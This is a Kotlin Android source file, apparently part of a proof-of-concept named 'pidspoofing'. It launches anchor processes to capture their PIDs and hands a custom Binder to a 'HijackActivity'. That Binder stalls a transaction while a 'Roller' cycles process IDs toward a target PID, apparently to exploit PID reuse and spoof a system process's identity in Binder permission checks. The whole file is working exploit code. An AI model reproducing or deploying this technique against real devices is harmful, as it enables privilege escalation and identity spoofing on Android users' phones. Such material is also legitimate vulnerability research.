package jp.plum.pidspoofing

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.jetbrains.anko.button
import org.jetbrains.anko.intentFor
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import java.util.concurrent.LinkedBlockingQueue

class MainActivity : AppCompatActivity() {
    companion object {
        const val Key = "Key"
        const val RequestRemain = IBinder.FIRST_CALL_TRANSACTION
        const val RollingTo = IBinder.LAST_CALL_TRANSACTION
    }

    private val anchors = LinkedBlockingQueue<Int>()
    private val placeholders = mutableListOf<Int>()
    val queue = LinkedBlockingQueue<Int>()
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        verticalLayout {
            button("setup anchor process") {
                onClick {
                    listOf(A1::class, A2::class, A3::class).map {
                        val intent = Intent(this@MainActivity, it.java)
                        val connection = object : ServiceConnection {
                            override fun onServiceConnected(
                                name: ComponentName,
                                service: IBinder
                            ) {
                                Log.e(TAG, "service-connected: $name")
                                val args = Parcel.obtain()
                                val rsp = Parcel.obtain()
                                service.transact(AnchorService.ReportPid, args, rsp, 0)
                                anchors.add(rsp.readInt())
                                stopService(intent)
                                unbindService(this)
                            }

                            override fun onServiceDisconnected(name: ComponentName) {
                                Log.e(TAG, "service-disconnected: $name")
                            }
                        }
                        bindService(
                            intent,
                            connection,
                            Context.BIND_AUTO_CREATE
                        )
                    }

                    launch(Dispatchers.IO) {
                        val pid = (0 until 3).map { anchors.take() }
                        placeholders.addAll(pid)
                        withContext(Dispatchers.Main) {
                            text = "anchor pid: ${pid.joinToString(",")}"
                        }
                    }

                }
            }

            button("Bring Binder to Hijacker") {
                onClick {
                    startActivity(
                        intentFor<HijackActivity>().putExtra(Key, object : Binder() {
                            override fun onTransact(
                                code: Int,
                                data: Parcel,
                                reply: Parcel,
                                flags: Int
                            ): Boolean {
                                return when (code) {
                                    RollingTo -> {
                                        val targetPid = data.readInt()
                                        queue.put(targetPid)
                                        super.onTransact(code, data, reply, flags)
                                    }
                                    RequestRemain -> {
                                        Log.e(
                                            TAG,
                                            "request for position: ${data.readInt()} block begin"
                                        )
                                        val toPid = queue.take()
                                        Log.e(TAG, "we wish rolling system process to $toPid")
                                        val spawned = Roller.toPid(toPid, placeholders.toList())
                                        Log.e(TAG, "we spawned to $spawned")
                                        (0..HijackActivity.source.size - HijackActivity.limit).forEach {
                                            reply.writeInt(1)
                                            reply.writeString("hello $it")
                                        }
                                        Log.e("natsuki", "blocking end")
                                        true
                                    }

                                    else -> super.onTransact(code, data, reply, flags)
                                }
                            }
                        })
                    )
                }
            }
        }
    }
}